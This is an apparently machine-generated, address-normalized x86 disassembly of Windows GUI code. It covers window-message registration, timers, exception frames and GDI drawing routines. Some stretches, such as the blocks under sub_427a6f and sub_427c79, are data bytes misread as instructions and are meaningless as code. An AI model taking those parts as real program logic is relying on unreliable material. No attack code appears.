mov edx [ ebp - 0x2c ]
mov eax [ ebx + 0x58 ]
call sub_41c55c
sub_427880
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42791d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
lea edx [ edi + 0x1c ]
mov ecx 0x20
call sub_4040e8
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_41c784
mov edx [ edi ]
mov eax [ esi + 0x58 ]
call sub_41c744
cmp [ esi + 0x70 ] 0x0
je r-xdata
mov bl [ r-xdata ]
cmp [ edi + 0x10 ] 0x190
jle r-xdata
mov dl [ edi + 0x17 ]
mov eax [ esi + 0x58 ]
call sub_41c88c
cmp [ edi + 0x14 ] 0x0
je r-xdata
or bl 0x1
cmp [ edi + 0x15 ] 0x0
je r-xdata
or bl 0x2
cmp [ edi + 0x16 ] 0x0
je r-xdata
or bl 0x4
mov edx ebx
mov eax [ esi + 0x58 ]
call sub_41c828
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427924
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
or bl 0x8
sub_4279d4
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408a04
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_427a6f
add [ edi ] cl
add [ eax ] al
add ah bl
cmpsd [ esi ] [ edi ]
inc esi
add [ esi + ebp * 4 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add al bl
cmpsd [ esi ] [ edi ]
inc esi
add [ eax + esi * 4 + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add ah dl
cmpsd [ esi ] [ edi ]
inc esi
add [ eax ] bl
scasb [ edi ]
inc esi
add [ eax ] al
add [ eax ] al
add al dl
cmpsd [ esi ] [ edi ]
inc esi
add [ ecx + esi * 4 + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add ah cl
cmpsd [ esi ] [ edi ]
inc esi
add [ eax + esi * 4 + 0x46 ] al
add [ eax ] al
enter 0x46a7 0x0
sub [ eax + 0x46 ] dh
add [ eax ] al
les esp [ edi - 0x4eefffba ]
inc esi
add [ eax ] al
add [ eax ] al
add al al
cmpsd [ esi ] [ edi ]
inc esi
add [ eax - 0x51 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ edi - 0x4fc3ffba ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x63ffb959 ] bh
scasd [ edi ]
inc esi
add [ eax ] al
add [ eax ] al
add [ edi - 0x4e0fffba ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x7bffb959 ] al
scasb [ edi ]
inc esi
add [ eax ] al
add [ eax ] al
add [ edi + 0x46 ] bh
add [ ecx + esi * 4 + 0x46 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x59 ] bh
inc esi
add [ eax + 0x46b1 ] bl
add [ eax ] al
add [ edi + 0x46 ] dh
add ah bl
scasd [ edi ]
inc esi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_427b7a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427b81
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_4048f4
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_427b84
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403c4c
call sub_4279d4
mov eax [ r-xdata ]
call sub_4130f4
mov eax [ r-xdata ]
call sub_413194
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413140
sub_427c79
cmp al 0x82
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
je r-xdata
inc eax
add [ eax ] dh
add [ eax ] al
dec [ edx + eax * 4 + 0x42 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
add [ eax ] al
push 0x65
arpl [ ecx + eax + 0x7 ] si
dec esi
ja r-xdata
jb r-xdata
jae r-xdata
imul edi [ edx + 0x65 ] 0x746e4907
jb r-xdata
jb r-xdata
popad
insb
int3
inc ebx
add al ah
cdq
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add [ ebx + esi + 0x5fbc0040 ] al
imul ebp [ esi + 0x65 ] 0x55737208
jo r-xdata
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
push es
adc [ eax ] al
insb
add [ eax ] eax
add [ edi ] al
or [ ebx + edx * 2 + 0x70 ] edx
insb
imul esi [ esp + esi * 2 + 0x65 ] 0x427de472
add [ ecx + edx ] ch
inc ebx
add [ edi ] dl
add [ eax ] cl
inc ebp
js r-xdata
add [ esp + ebp * 2 + 0x43 ] ah
add [ eax + eax * 2 + 0x3ff00043 ] al
add [ esp + ebp * 2 + 0x60940043 ] bl
popad
je r-xdata
lodsb [ esi ]
jle r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
push eax
jge r-xdata
push esp
inc ebx
je r-xdata
add [ eax + 0x3e740043 ] dl
inc ecx
or [ edx + 0x73 ] esi
push eax
popad
je r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 2 + 0x42 ] bh
je r-xdata
add [ ebx ] al
or al 0x54
push edx
jae r-xdata
test al 0x41
add [ eax ] dh
add bh bh
cmc
inc edx
add [ eax ] bh
add bh bh
ror [ ebp + 0x43 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xe ] al
push es
add [ esi ] al
inc ebx
jne r-xdata
dec ebp
insb
jae r-xdata
inc ecx
add al ah
dec ecx
inc ebx
add al bh
cdq
jb r-xdata
xchg esi eax
insb
jae r-xdata
cmp [ eax ] dl
jpe r-xdata
jge r-xdata
jae r-xdata
[ ecx + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
add [ eax ] dl
inc eax
add [ ecx + eax ] ch
add al bh
cmc
inc edx
add [ ebx ] bl
add bh bh
enter 0x4340 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
inc ebx
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
or [ ebp + 0x78 ] al
je r-xdata
pop es
dec ecx
outsb
je r-xdata
inc eax
add ah ah
jge r-xdata
add [ eax ] al
push ebx
je r-xdata
bound ebp [ ebp + 0x3c ]
add [ eax - 0x5700ffff ] ch
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
or edx [ edx + 0x65 ]
jae r-xdata
dec esp
jb r-xdata
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] al
mov esp 0xc000435f
js r-xdata
jb r-xdata
inc ebx
xor [ eax ] al
add [ ebx + 0x6c9c0042 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 2 + 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc ebx
add al al
pop edi
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebp + edi * 2 + 0x42 ] cl
add [ esi ] al
jb r-xdata
xor al ch
add eax [ eax ]
add [ esi + 0x68 ] dl
cmp al 0x81
inc edx
add al ch
xlat
and bh bh
dec [ ecx - 0x3974cbba ]
jpe r-xdata
push edx
jae r-xdata
jpe r-xdata
inc ebx
add [ eax + 0x4d ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ 0xeff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
std
inc edx
add [ eax + eax ] dh
loopne r-xdata
inc ebx
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ eax ] ch
pop esi
inc ebx
add ah ah
outsb
inc ebx
add [ eax - 0xfffbcb0 ] cl
push eax
inc ebx
add [ eax + 0x41 ] dh
inc ebx
add ah bl
push eax
inc ebx
add [ eax + 0x14004285 ] cl
xchg [ edx ] eax
in al 0x86
inc edx
add [ 0xffffffffd4ffd500 ] al
call ebx
call eax
inc edi
inc [ eax - 0x79 ]
inc edx
add [ ebx + ecx * 4 + 0x42 ] dl
add ah bh
mov eax [ edx ]
dec esp
test [ edx ] eax
cwde
mov [ edx ] es
or [ ebx + edx * 2 + 0x70 ] edx
insb
imul esi [ esp + esi * 2 + 0x65 ] 0xacc08b72
jle r-xdata
inc esp
inc ebx
add [ esi + edi * 2 + 0x1c80042 ] bl
inc edx
add [ edx ] 0xffffff9c
insb
dec esi
outsd
outsb
push es
jb r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
test bl bl
je r-xdata
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_42813c
call sub_41a3bc
mov [ esi + 0x34 ] eax
mov eax esi
int3
popad
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0x82880041 0x42
sub al 0x5b
inc ebx
add [ eax ] ch
pop ebx
inc ebx
add al bh
pop ebx
inc ebx
add al bh
inc ebx
add [ esi + eax * 2 ] bh
inc ebx
add [ eax - 0x37ffbcbb ] ah
dec esi
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
inc ebx
add [ esi + edi + 0x41 ] dh
xchg esp eax
pushad
dec esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070015 ] al
outsb
dec ebp
outsd
jbe r-xdata
adc [ eax ] al
dec eax
add [ eax ] al
push [ eax + 0x43 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
add al 0x0
add eax 0x74646957
push r-xdata
mov al 0x1
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
or ecx [ edi + 0x6e ]
inc ebx
insb
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
aam 0x4a
inc ebx
add [ esp + ebp * 2 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
add esp 0xc
pop [ 0x0 ]
int3
sub_4280b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419270
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_42813c
call sub_41a3bc
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_428104
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_4281b0
mov eax [ esi + 0x34 ]
call sub_41a470
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4192bc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_42813c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_428176
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4281b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42822f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428236
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
sub_428288
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43c594
mov [ esi + 0x16c ] 0x1
mov dl 0x3
mov eax esi
call sub_4340c8
mov edx 0x3
mov eax esi
call sub_434370
mov dx 0xfff2
mov eax esi
call sub_434dc0
mov [ esi + 0x188 ] 0x1e
mov [ esi + 0x1a8 ] 0x3
mov [ esi + 0x1a0 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_428300
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x170 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43c5f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_428330
push ebx
push esi
mov ebx eax
push 0x412
push 0x0
mov eax [ ebx + 0x30 ]
call sub_43b390
push eax
call GetDCEx
mov [ ebx + 0x180 ] eax
cmp [ ebx + 0x1a8 ] 0x3
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
mov eax [ ebx + 0x170 ]
call sub_41cd7c
push eax
mov eax [ ebx + 0x180 ]
push eax
call SelectObject
mov [ ebx + 0x1a4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cba0
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx 0xffffff
xor eax eax
call sub_4231a8
mov edx eax
mov eax esi
call sub_41cd1c
sub_4283ac
push ebx
add esp 0xfffffff8
mov ebx eax
mov al [ ebx + 0x184 ]
xor al 0x1
mov [ ebx + 0x184 ] al
mov ecx esp
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41245c
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x1ac ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x40 ]
add eax [ ebx + 0x1ac ]
mov [ esp ] eax
jmp r-xdata
push 0x5a0049
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call PatBlt
pop ecx
pop edx
pop ebx
retn
sub_428418
push ebx
mov ebx eax
mov eax [ ebx + 0x1a4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
mov eax [ ebx + 0x30 ]
call sub_43b390
push eax
call ReleaseDC
mov eax [ ebx + 0x170 ]
test eax eax
je r-xdata
push eax
mov eax [ ebx + 0x180 ]
push eax
call SelectObject
pop ebx
retn
call sub_403128
xor eax eax
mov [ ebx + 0x170 ] eax
sub_428460
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov esi eax
xor ebx ebx
mov ecx esp
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_41245c
mov al [ esi + 0x5b ]
dec al
je r-xdata
dec [ esp + 0x4 ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esi + 0x30 ]
call sub_4380c0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ esi + 0x4c ]
add [ esp + 0x4 ] eax
dec al
je r-xdata
xor ebx ebx
inc edi
xor ebp ebp
dec [ esp ]
jmp r-xdata
dec al
je r-xdata
inc ebp
dec edi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ esi + 0x48 ]
add [ esp ] eax
jmp r-xdata
jmp r-xdata
mov edx ebp
mov eax [ esi + 0x30 ]
call sub_438084
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_434554
mov eax [ esp + 0x10 ]
sub eax [ esp + 0x8 ]
jne r-xdata
mov eax ebx
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x14 ]
sub eax [ esp + 0xc ]
jne r-xdata
mov al [ esi + 0x5b ]
sub al 0x1
je r-xdata
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov al [ esi + 0x5b ]
sub al 0x1
je r-xdata
dec [ esp + 0x8 ]
jmp r-xdata
sub al 0x2
jne r-xdata
dec [ esp + 0xc ]
jmp r-xdata
sub al 0x2
jne r-xdata
inc [ esp + 0x10 ]
inc [ esp + 0x14 ]
sub_42854c
push ebx
mov ebx eax
mov eax ebx
call sub_433fc0
mov ax [ ebx + 0x78 ]
cmp ax 0xfff1
je r-xdata
mov al [ ebx + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp ax 0xfff2
jne r-xdata
mov dx 0xfff2
mov eax ebx
call sub_434dc0
mov dx 0xfff1
mov eax ebx
call sub_434dc0
jmp r-xdata
pop ebx
retn
sub_428588
push ebx
push esi
add esp 0xffffffe0
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41cd48
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x10 ]
mov eax [ ebx + 0x160 ]
call sub_41d120
cmp [ ebx + 0x16d ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
cmp [ ebx + 0x1c2 ] 0x0
je r-xdata
mov esi [ ebx + 0x160 ]
mov eax [ esi + 0x10 ]
mov dl 0x2
call sub_41cb44
mov eax [ esi + 0x10 ]
mov dl 0xe
call sub_41cb28
mov eax [ esi + 0x10 ]
mov edx 0xffd8ce
call sub_41ca48
mov eax [ esi + 0x14 ]
mov dl 0x1
call sub_41ce64
mov eax ebx
call sub_4345b8
push eax
mov eax ebx
call sub_4345fc
push eax
xor ecx ecx
xor edx edx
mov eax esi
call sub_41d1e8
push 0xffffffff
push 0x2
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0x2
push 0xffffffff
lea eax [ esp + 0x8 ]
push eax
call InflateRect
jmp r-xdata
add esp 0x20
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax 0xff000014
call sub_41c09c
push eax
call CreateSolidBrush
mov esi eax
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_41d4a0
push eax
call FrameRect
push esi
call DeleteObject
push 0xfffffffe
push 0xfffffffe
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax 0xff000010
call sub_41c09c
push eax
call CreateSolidBrush
mov esi eax
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_41d4a0
push eax
call FrameRect
push esi
call DeleteObject
sub_4286e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ esi ]
cmp edx [ ebx + 0x188 ]
jg r-xdata
cmp [ ebx + 0x16c ] 0x0
je r-xdata
xor edx edx
mov [ esi ] edx
sub_428714
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x1b2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_428740
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_436170
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_428460
mov [ ebx + 0x174 ] eax
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
call sub_41245c
mov eax [ ebp - 0xc ]
mov [ ebx + 0x178 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x17c ] eax
cmp [ ebx + 0x174 ] 0x0
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
call sub_4345fc
sub eax [ ebx + 0x188 ]
mov [ ebx + 0x18c ] eax
mov eax [ ebx + 0x30 ]
call sub_4380c0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_4345b8
sub eax [ ebx + 0x188 ]
mov [ ebx + 0x18c ] eax
mov eax [ ebx + 0x30 ]
call sub_4380c0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x174 ]
mov eax [ eax + 0x4c ]
add [ ebx + 0x18c ] eax
inc esi
xor edi edi
mov eax [ ebx + 0x174 ]
mov eax [ eax + 0x48 ]
add [ ebx + 0x18c ] eax
jmp r-xdata
inc esi
xor edi edi
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ecx
mov [ ebx + 0x168 ] eax
mov edx [ eax + 0x1d8 ]
mov [ ebx + 0x198 ] edx
mov edx [ eax + 0x1dc ]
mov [ ebx + 0x19c ] edx
mov eax [ ebx + 0x168 ]
mov [ eax + 0x1dc ] ebx
mov [ eax + 0x1d8 ] sub_428c50
inc edi
dec esi
jne r-xdata
mov eax [ eax + 0x4c ]
sub [ ebx + 0x18c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_428b3c
mov eax ebx
call sub_428330
mov eax ebx
call sub_44c724
mov edx eax
mov ecx [ edx + 0x220 ]
test ecx ecx
je r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ eax + 0x5b ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax ebx
call sub_4283ac
sub al 0x2
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_438084
mov dl [ eax + 0x5b ]
dec edx
sub dl 0x2
jae r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_438084
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ eax + 0x48 ]
sub [ ebx + 0x18c ] eax
sub_4288e4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x1a0 ]
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
dec dl
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_434394
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ba ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_437c28
xor edx edx
push ebp
push sub_428a20
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
mov edx [ eax + 0x4c ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x190 ]
add edx [ eax + 0x44 ]
call sub_434348
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x190 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_434394
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_437c30
retn
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a0 ] eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_434370
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_437c28
xor edx edx
push ebp
push sub_4289b3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
mov edx [ eax + 0x48 ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x190 ]
add edx [ eax + 0x40 ]
call sub_434324
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x190 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_434370
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_437c30
retn
jmp r-xdata
sub_428a68
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ecx edx
mov esi eax
mov edi [ ebp + 0xc ]
mov dl [ esi + 0x5b ]
mov eax edx
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ esi + 0x17c ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
sub ecx [ esi + 0x178 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x4c ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
jmp r-xdata
dec cl
je r-xdata
xor eax eax
mov ecx edx
dec cl
je r-xdata
mov [ edi ] eax
cmp eax [ esi + 0x188 ]
jge r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x4c ]
mov ecx [ ebp + 0x8 ]
sub eax [ ecx ]
dec cl
je r-xdata
cmp eax [ esi + 0x18c ]
jle r-xdata
mov ecx [ esi + 0x188 ]
mov [ edi ] ecx
jmp r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x48 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
jmp r-xdata
dec cl
je r-xdata
cmp eax [ edi ]
je r-xdata
mov ecx [ esi + 0x18c ]
mov [ edi ] ecx
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x48 ]
mov ecx [ ebp + 0x8 ]
sub eax [ ecx ]
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ecx
pop ebp
retn 0x8
sub dl 0x2
je r-xdata
sub eax [ edi ]
jmp r-xdata
sub dl 0x2
jne r-xdata
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov edx [ edi ]
sub edx eax
mov eax edx
sub_428b54
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_436428
